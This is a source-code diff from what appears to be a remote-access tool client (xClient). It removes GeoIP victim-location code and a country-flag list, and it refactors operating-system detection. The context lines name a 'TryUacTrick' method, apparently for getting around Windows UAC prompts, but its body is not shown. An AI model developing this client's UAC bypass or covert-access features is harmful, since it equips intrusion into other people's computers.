@@ -10,13 +10,11 @@ using System.Threading;
 using System.Windows.Forms;
 using Microsoft.Win32;
 using xClient.Config;
-using xClient.Core.Information;
 using xClient.Core.Encryption;
 using xClient.Core.Extensions;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
 using xClient.Enums;
-using xServer.Core.Helper;
 
 namespace xClient.Core
 {
@@ -38,50 +36,17 @@ namespace xClient.Core
             [MarshalAs(UnmanagedType.U4)] public UInt32 dwTime;
         }
 
-        public static readonly string[] ImageList =
-        {
-            "ad.png", "ae.png", "af.png", "ag.png", "ai.png", "al.png",
-            "am.png", "an.png", "ao.png", "ar.png", "as.png", "at.png", "au.png", "aw.png", "ax.png", "az.png", "ba.png",
-            "bb.png", "bd.png", "be.png", "bf.png", "bg.png", "bh.png", "bi.png", "bj.png", "bm.png", "bn.png", "bo.png",
-            "br.png", "bs.png", "bt.png", "bv.png", "bw.png", "by.png", "bz.png", "ca.png", "catalonia.png", "cc.png",
-            "cd.png", "cf.png", "cg.png", "ch.png", "ci.png", "ck.png", "cl.png", "cm.png", "cn.png", "co.png", "cr.png",
-            "cs.png", "cu.png", "cv.png", "cx.png", "cy.png", "cz.png", "de.png", "dj.png", "dk.png", "dm.png", "do.png",
-            "dz.png", "ec.png", "ee.png", "eg.png", "eh.png", "england.png", "er.png", "es.png", "et.png",
-            "europeanunion.png", "fam.png", "fi.png", "fj.png", "fk.png", "fm.png", "fo.png", "fr.png", "ga.png",
-            "gb.png", "gd.png", "ge.png", "gf.png", "gh.png", "gi.png", "gl.png", "gm.png", "gn.png", "gp.png", "gq.png",
-            "gr.png", "gs.png", "gt.png", "gu.png", "gw.png", "gy.png", "hk.png", "hm.png", "hn.png", "hr.png", "ht.png",
-            "hu.png", "id.png", "ie.png", "il.png", "in.png", "io.png", "iq.png", "ir.png", "is.png", "it.png", "jm.png",
-            "jo.png", "jp.png", "ke.png", "kg.png", "kh.png", "ki.png", "km.png", "kn.png", "kp.png", "kr.png", "kw.png",
-            "ky.png", "kz.png", "la.png", "lb.png", "lc.png", "li.png", "lk.png", "lr.png", "ls.png", "lt.png", "lu.png",
-            "lv.png", "ly.png", "ma.png", "mc.png", "md.png", "me.png", "mg.png", "mh.png", "mk.png", "ml.png", "mm.png",
-            "mn.png", "mo.png", "mp.png", "mq.png", "mr.png", "ms.png", "mt.png", "mu.png", "mv.png", "mw.png", "mx.png",
-            "my.png", "mz.png", "na.png", "nc.png", "ne.png", "nf.png", "ng.png", "ni.png", "nl.png", "no.png", "np.png",
-            "nr.png", "nu.png", "nz.png", "om.png", "pa.png", "pe.png", "pf.png", "pg.png", "ph.png", "pk.png", "pl.png",
-            "pm.png", "pn.png", "pr.png", "ps.png", "pt.png", "pw.png", "py.png", "qa.png", "re.png", "ro.png", "rs.png",
-            "ru.png", "rw.png", "sa.png", "sb.png", "sc.png", "scotland.png", "sd.png", "se.png", "sg.png", "sh.png",
-            "si.png", "sj.png", "sk.png", "sl.png", "sm.png", "sn.png", "so.png", "sr.png", "st.png", "sv.png", "sy.png",
-            "sz.png", "tc.png", "td.png", "tf.png", "tg.png", "th.png", "tj.png", "tk.png", "tl.png", "tm.png", "tn.png",
-            "to.png", "tr.png", "tt.png", "tv.png", "tw.png", "tz.png", "ua.png", "ug.png", "um.png", "us.png", "uy.png",
-            "uz.png", "va.png", "vc.png", "ve.png", "vg.png", "vi.png", "vn.png", "vu.png", "wales.png", "wf.png",
-            "ws.png", "ye.png", "yt.png", "za.png", "zm.png", "zw.png"
-        };
-
         public static UserStatus LastStatus { get; set; }
         public static bool Disconnect { get; set; } // when Disconnect is true, stop all running threads
         public static string OperatingSystem { get; set; }
         public static string MyPath { get; set; }
         public static string InstallPath { get; set; }
-        public static string AccountType { get; set; }
         public static string WanIp { get; set; }
-        public static string Country { get; set; }
-        public static string CountryCode { get; set; }
-        public static string Region { get; set; }
-        public static string City { get; set; }
-        public static int ImageIndex { get; set; }
+        public static string AccountType { get; set; }
 
         public static string GetOperatingSystem()
         {
-            return string.Format("{0} {1} Bit", OSInfo.Name, OSInfo.Bits);
+            return string.Format("{0} {1} Bit", PlatformHelper.Name, PlatformHelper.Architecture);
         }
 
         public static string GetAccountType()
@@ -295,32 +260,6 @@ namespace xClient.Core
             }
 
             return "-";
-        }
-
-        public static void InitializeGeoIp()
-        {
-            GeoIP gIp = new GeoIP();
-
-            Country = gIp.Country;
-            CountryCode = gIp.CountryCode;
-            Region = gIp.Region;
-            City = gIp.City;
-            WanIp = gIp.WanIp;
-
-            if (CountryCode == "-" || Country == "Unknown")
-            {
-                ImageIndex = 247; // question icon
-                return;
-            }
-
-            for (int i = 0; i < ImageList.Length; i++)
-            {
-                if (ImageList[i].Contains(CountryCode.ToLower()))
-                {
-                    ImageIndex = i;
-                    break;
-                }
-            }
         }
 
         public static bool TryUacTrick()
